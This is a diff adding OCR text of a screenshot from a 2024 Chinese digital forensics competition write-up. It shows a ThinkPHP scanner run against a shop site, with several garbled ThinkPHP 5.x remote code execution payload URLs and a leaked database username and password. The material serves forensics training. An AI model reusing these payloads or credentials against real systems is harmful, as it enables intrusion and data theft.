@@ -1,0 +1,25 @@
+# OCR: faad99ea855c071cbdf038ed1be020cd.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/faad99ea855c071cbdf038ed1be020cd.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:14
+
+图
+URL: 路径：
+信息
+http://www.tjshop.com/ 命令执行
+检测所有漏洞中...
+[-]不存在ThinkPHP5.0RCE
+ThinkphpGUIBy莲花
+版本：导入
+ALL
+批量检测
+[+]存在ThinkPHP 5.0.10 construct RCE
+Payload:http://www.tjshop.com//?s=adminPost:method=construct&method=get&filter[]=phpinfo&get[]=-1[+]存在ThinkPHP5.0.22/5.1.29RCE
+GetSehll
+Payload:http://www.tjshop.com//?s=/admin/thinklapp/invokefunction&function=call_user_func_array&vars[]=phpinfo&vars[1][+］存在ThinkPHP5.0.23RCE
+Payload:http://www.tjshop.com//?s=captcha&test=-1Post:_method=_ConStruct&method=get&filter[]=call_user_func&get[0
+[-]不存在ThinkPHP5.0.24-5.1.30RCE[-1 不存在ThinkPHP 3.xRCE
+[+］存在ThinkPHP5.x数据库信息泄露
+Payload:username:roothostname:localhostpassword:a7b3el6ac2oblobbdatabase:tpshop2.0
+[-]不存在ThinkPHP3.xLogRCE[-]不存在ThinkPHP5.x日志泄露[-]不存在ThinkPHP 3.x日志泄露[-]不存在ThinkPHP6.x日志泄露
